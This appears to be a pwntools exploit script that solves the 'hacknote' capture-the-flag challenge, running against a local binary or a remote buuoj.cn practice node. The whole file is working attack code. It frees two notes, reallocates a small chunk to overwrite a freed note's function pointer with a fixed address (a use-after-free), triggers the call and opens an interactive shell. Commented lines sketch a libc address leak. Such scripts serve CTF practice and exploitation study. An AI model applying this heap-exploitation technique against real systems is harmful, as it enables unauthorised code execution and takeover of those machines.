import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./hacknote')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./hacknote')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',25234)
			elf=ELF('./hacknote')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

		def add(a,c):
			io.sendlineafter('Your choice :','1')
			io.sendlineafter('Note size :',str(a))
			io.sendafter('Content :',c)

		def delete(a):
			io.sendlineafter('Your choice :','2')
			io.sendlineafter('Index :',str(a))

		def show(a):
			io.sendlineafter('Your choice :','3')
			io.sendlineafter('Index :',str(a))


		add(0x32,'aaaa')
		add(0x32,'aaaa')
		delete(0)
		delete(1)
		add(0x8,p32(0x08048945))
		show(0)
		


		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue